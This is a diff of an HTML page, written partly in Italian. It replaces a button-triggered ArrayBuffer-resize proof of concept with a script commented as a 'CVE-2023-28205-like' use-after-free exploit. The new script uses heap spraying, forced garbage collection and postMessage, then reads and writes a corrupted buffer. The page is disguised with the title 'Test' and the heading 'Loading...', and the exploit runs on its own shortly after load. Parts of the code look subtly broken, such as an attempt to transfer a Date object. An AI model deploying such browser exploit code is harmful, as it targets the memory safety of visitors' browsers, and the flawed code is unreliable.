@@ -1,30 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - ArrayBuffer Resize</title>
+    <title>Test</title>
 </head>
 <body>
-    <h1>Test Vulnerabilità ArrayBuffer</h1>
-    <button onclick="testVulnerability()">Esegui Test</button>
+    <h1>Loading...</h1>
+
     <script>
-        function testVulnerability() {
+        // exploit.js - CVE-2023-28205-like UAF PoC
+        let sprayBuffers = [];
+        let retained = { ref: null };
+
+        function triggerGC() {
             try {
-                const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
-                const u8 = new Uint8Array(ab);
-
-                function call_back() {
-                    ab.resize(0);
-                    alert("ArrayBuffer ridimensionato a 0.");
-                    return 0;
+                const tmp = [];
+                for (let i = 0; i < 100000; i++) {
+                    tmp.push(new Uint8Array(0x1000));
                 }
+            } catch(e) { alert("GC Error: " + e); }
+        }
 
-                alert("Inizio copyWithin...");
-                u8.copyWithin(0x20, { valueOf: call_back });
-                alert("Operazione completata.");
-            } catch (e) {
-                alert("Errore durante l'esecuzione: " + e.message);
+        function setupPrimitive() {
+            const arr = [];
+            for (let i = 0; i < 100; i++) {
+                arr.push({ a: 0x1337, b: new Date(0xdeadbeef) });
+            }
+            return arr;
+        }
+
+        function heapSpray() {
+            const marker = 0x41414141;
+            const bufferSize = 0x1000;
+
+            for (let i = 0; i < 0x500; i++) {
+                const buf = new ArrayBuffer(bufferSize);
+                const view = new Uint32Array(buf);
+                view[0] = marker;
+                sprayBuffers.push(buf);
+            }
+            retained.ref = sprayBuffers;
+            alert("Heap spraying completato!");
+        }
+
+        function findOverwrittenBuffer() {
+            for (let i = 0; i < sprayBuffers.length; i++) {
+                const view = new Uint32Array(sprayBuffers[i]);
+                if (view[0] !== 0x41414141) {
+                    alert("Buffer corrotto trovato alla posizione: " + i);
+                    return sprayBuffers[i];
+                }
+            }
+            return null;
+        }
+
+        async function main() {
+            try {
+                alert("Avvio exploit...");
+                const vulnerable = setupPrimitive();
+                heapSpray();
+
+                const prom = new Promise(resolve => {
+                    addEventListener('message', e => {
+                        setTimeout(() => {
+                            triggerGC();
+                            const targetBuf = findOverwrittenBuffer();
+                            
+                            if(targetBuf) {
+                                const magic = new Uint32Array(targetBuf);
+                                alert("Dati letti: 0x" + magic[0].toString(16));
+                                magic[2] = 0x58585858;
+                                alert("Scrittura riuscita!");
+                            }
+                            resolve();
+                        }, 500);
+                    }, { once: true });
+                });
+
+                postMessage(vulnerable, '*', [vulnerable[50].b]);
+                await prom;
+
+            } catch(e) {
+                alert("Errore critico: " + e);
             }
         }
+
+        // Avvia automaticamente dopo 2 secondi
+        setTimeout(() => {
+            main().catch(e => alert("Errore: " + e));
+        }, 2000);
     </script>
 </body>
 </html>
